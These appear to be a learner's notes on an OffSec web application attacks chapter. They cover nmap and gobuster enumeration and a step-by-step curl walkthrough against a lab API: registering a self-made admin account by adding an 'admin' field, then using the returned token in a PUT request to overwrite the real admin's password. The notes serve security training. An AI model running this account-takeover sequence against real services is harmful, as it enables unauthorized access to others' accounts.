[x] # 8. Introduction to Web Application Attacks
It doesn't get interesting until 8.3.3. Here are some commands for the sections before that.

sudo nmap -p80  -sV 192.168.50.20
sudo nmap -p80 --script=http-enum 192.168.50.20
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

[x] ## 8.1. Web Application Assessment Methodology
no notes
## 8.2. Web Application Assessment Tools
no notes
[x] ### 8.2.1. Fingerprinting Web Servers with Nmap
sudo nmap -p80  -sV 192.168.50.20

Initial fingerprinting of webserver
sudo nmap -p80 --script=http-enum 192.168.50.20

[x] ### 8.2.2. Technology Stack Identification with Wappalyzer
https://www.wappalyzer.com/

[x] ### 8.2.3. Directory Brute Force with Gobuster
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
-u: Target ip
-w: Wordlist
-t: num threads

[x] ### 8.2.4 Security Testing with Burp Suite
no notes
## 8.3 Web Application Enumeration

[x] ### 8.3.1. Debugging Page Content
Java based web applications might use .jsp, .do or .html

[x] ### 8.3.2. Inspecting HTTP Response Headers and Sitemaps
Http headers that start with X- generally mean non standard. X- headers are depreciated

[x] ### 8.3.3. Enumerating and Abusing APIs
api paths are often followed by versions e.g /api_name/v1

API busting using both a wordlist and pattern combined

step 1) create a file with some patterns called pattern (GOBUSTER essentially acts as FUZZ in other fuzzers)
{GOBUSTER}/v1
{GOBUSTER}/v2

step 2) gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

Website.com/ui -> The /ui path has documentation on all apis... usually only available with whitebox testing

curl -i http://192.168.50.16:5002/users/v1
-i: show headers

target admin user for api
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

attempt to curl password from users api
curl -i http://192.168.50.16:5002/users/v1/admin/password

error 405 = url is present but we need to use another type of http request 

Attempt to convert get request into post request
curl request with parameters wrapped in json (pretty easy {"fieldname":"value","fieldname2":"value2"}
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
-d: Send data in a post request
-H: add header to request

failed Attempt to use register api via curl
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

fixed attempt to register now with email as a parameter added. they also guessed that there is an admin parameter that accepts True or False
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

log in using curl to our created admin account. The response may have a token we can use for further attacks 
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

Failed attempt Using that token returned to change the admin's account password (failed because the method wasn't allowed)
NOTE: Realize that this exploit is happening within HTTP Headers!
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

Fixed attempt using Put method to replace the value instead of creating one
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

final login to verify exploit
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

Summary of what they did...
They found APIS by using a fuzzer (enumeration)

They tried using the api with various parameters to further dig into it.
e.g. gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt to target the admin user.
This shows that http://192.168.50.16:5002/users/v1/admin/email and http://192.168.50.16:5002/users/v1/admin/password apis exist.
They noticed that the api responds in JSON so sent all further requests using JSON

They guessed that a login api probably exists (operating under unknowns)
curl -i http://192.168.50.16:5002/users/v1/login

they converted get request to post request

Then they created an admin account to change the actual admin's password

Lab notes: Gobusters progress does not always end at 100%. With the 2 patterns, it endded at 300%. I imagine its for the following:
/:              100% +
/{GOBUSTER}/v1: 100% + 
/{GOBUSTER}/v2: 100%
                = 300%.

I stopped the scan early after 200% and did not find 2 of the API points. Also it does not appear to be sequential order as /users/v1 was one of the last things found

The labs had me look at the following locations to get flags
URL
Source Code of various pages
APIs / fuzzing
source code of css and java script (I wonder what can be gained from inspecting CSS..)
executing javascript

Also Gobuster would act weird if I did not put the correct path to the Api... it would throw up an error like "Error: the server returns a status code that matches the provided options for non existing urls."
I'm not entirely sure of whether I should use this as an indicator that maybe I am putting in the command wrong, or if this was just a one-time thing because there are flags to avoid certain lengths...

### 8.4.1 Stored vs Reflected XSS Theory



<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
Extra Reading   
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><

8.4.1 Stored vs Reflected XSS Theory
https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_(or_stored)
https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent_(reflected)
https://en.wikipedia.org/wiki/Cross-site_scripting#Server-side_versus_DOM-based_vulnerabilities
https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction

8.3.3 Enumerating and Abusing APIs
https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/JSON
  JSON supports strings, numbers, arrays, booleans, and other object literals.
  Only properties, no methods. (you can't put a function inside JSON)

https://en.wikipedia.org/wiki/JSON_Web_Token
  Tokens are signed with private secret(symmetric) or public/private keys(asymmetric). This was a really dumb way to say that they are signed with either symmetric or asymmetric keys.
  The algorithm used to sign the token is specified within the token
  Token is signature is done using Base64URL.. This made me wonder on what prevents a JWT from just being stolen... I believe it is TLS/SSL....

  This led me down a rabbit hole of SSL... Learned the following things
  Your machine can verify if a cert is legit by using a certificate authority. These can be self-signed or come installed on the machine.
  Bad certificates can lead to MITM attacks... think burpsuite... 
  The reason why burpsuite can intercept traffic in plain english and not garbled nonsense is because you install a burpsuite certificate authority certificate. This lets you decrypt all the traffic on route to the website.
  If a tester is able to put a rogue certificate authority on a machine, they will be able de-crypt any traffic passing over the internet...
  "Burp generates its own TLS certificate for each host, signed by its own Certificate Authority (CA). This CA certificate is generated the first time you launch Burp, and stored locally.
  Burp will then use this CA certificate to create and sign a TLS certificate for each host that you visit, allowing you to browse HTTPS URLs as normal."




8.3.2. Inspecting HTTP Response Headers and Sitemaps
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
https://www.rfc-editor.org/rfc/rfc6648
https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior
https://www.sitemaps.org/

8.3.1 Debugging Page Content
https://en.wikipedia.org/wiki/Web_framework#URL_mapping
https://jquery.com/
https://en.wikipedia.org/wiki/Minification_(programming)



8.2.4 Security Testing with Burp Suite
https://portswigger.net/burp
https://www.java.com/en/download/help/whatis_java.html
https://en.wikipedia.org/wiki/Captive_portal
https://portswigger.net/burp/documentation/desktop/tools/intruder/using


8.2.3. Directory Brute Force with Gobuster
https://www.kali.org/tools/gobuster/

8.2.2 Technology stack id with Wappalyzer
https://www.wappalyzer.com/

8.1. Web Application Assessment Methodology
https://owasp.org/www-project-top-ten/
